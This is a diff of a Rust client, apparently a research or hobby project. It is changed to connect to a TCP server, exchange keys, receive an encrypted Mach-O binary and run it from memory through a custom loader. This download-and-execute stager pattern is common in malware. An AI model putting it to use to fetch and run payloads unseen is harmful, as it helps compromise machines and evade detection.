@@ -1,29 +1,14 @@
-use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::time::Duration;
 
 use loader::VM;
-use rsa::pkcs8::EncodePublicKey;
-use rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
 use object::{macho, Object, ObjectSegment};
 use object::read::macho::MachOFile64;
 use object::LittleEndian as LE;
+use shared::Error;
 
 mod relocs;
 mod loader;
-
-#[derive(Debug)]
-pub enum Error {
-    Connect,
-    StreamRead,
-    StreamWrite,
-    StreamClosed,
-    PubkeyCorrupt,
-    Decryption,
-    SegmentRead,
-}
-
-const ENC_SIZE: usize = 256;
 
 fn write_flattened_binary(obj: &MachOFile64<LE>) -> Result<VM, loader::Error> {
     let mut segments = Vec::new();
@@ -58,22 +43,28 @@ fn write_flattened_binary(obj: &MachOFile64<LE>) -> Result<VM, loader::Error> {
     Ok(vm)
 }
 
-// format:
-//
-// sections* ->
-//  relocation*
-//  alignment
-//  addr
-//  data
-fn load_bin() {
-    let mut path = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
-    path.push("../ptrace");
+fn connect() -> Result<TcpStream, Error> {
+    let addr = "0.0.0.0:3771".parse().unwrap();
+    let timeout = Duration::from_secs(3);
+    let stream = TcpStream::connect_timeout(&addr, timeout).map_err(|_| Error::Connect)?;
+    println!("Connected to the server!");
 
-    let mut file = std::fs::File::open(path).unwrap();
-    let mut data = Vec::new();
-    file.read_to_end(&mut data).unwrap();
+    let _ = stream.set_read_timeout(Some(timeout));
+    let _ = stream.set_write_timeout(Some(timeout));
 
-    let obj = MachOFile64::parse(&*data).unwrap();
+    Ok(stream)
+}
+
+fn main() -> Result<(), Error> {
+    let mut stream = connect()?;
+
+    let (public_key, secret_key) = shared::gen_keypair();
+    let sym_key = shared::exchange_keys(&mut stream, &secret_key, &public_key)?;
+
+    let binary = shared::net::recv(&mut stream, &sym_key)?;
+    println!("Received binary of size {:#X}.", binary.len());
+
+    let obj = MachOFile64::parse(&*binary).unwrap();
 
     for lcmd in obj.macho_load_commands().unwrap() {
         if let Ok(macho::LC_DYLD_INFO | macho::LC_DYLD_INFO_ONLY) = lcmd.map(|cmd| cmd.cmd()) {
@@ -89,45 +80,6 @@ fn load_bin() {
 
     let exit_code = unsafe { vm.exec(obj.entry()).unwrap() };
     println!("Program exited with code: {exit_code}");
-}
-
-fn main() -> Result<(), Error> {
-    println!("Generating key pair.");
-    let mut rng = rand::thread_rng();
-    let bits = 2048;
-    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
-    let pub_key = RsaPublicKey::from(&priv_key);
-
-    let addr = "0.0.0.0:3771".parse().unwrap();
-    let timeout = Duration::from_secs(3);
-    let mut stream = TcpStream::connect_timeout(&addr, timeout).map_err(|_| Error::Connect)?;
-    println!("Connected to the server!");
-
-    let _ = stream.set_read_timeout(Some(timeout));
-    let _ = stream.set_write_timeout(Some(timeout));
-
-    let pub_key_encoded = pub_key
-        .to_public_key_pem(rsa::pkcs8::LineEnding::LF)
-        .map_err(|_| Error::PubkeyCorrupt)?;
-
-    stream
-        .write_all(pub_key_encoded.as_bytes())
-        .map_err(|_| Error::StreamWrite)?;
-    println!("Send public key.");
-
-    let mut payload_len = [0; ENC_SIZE];
-    stream
-        .read_exact(&mut payload_len)
-        .map_err(|_| Error::StreamRead)?;
-
-    let payload_len = priv_key
-        .decrypt(Pkcs1v15Encrypt, &payload_len)
-        .map_err(|_| Error::Decryption)?;
-    let payload_len = u64::from_be_bytes(payload_len.try_into().unwrap());
-
-    println!("Received payload size {payload_len}.");
-
-    load_bin();
 
     Ok(())
 }
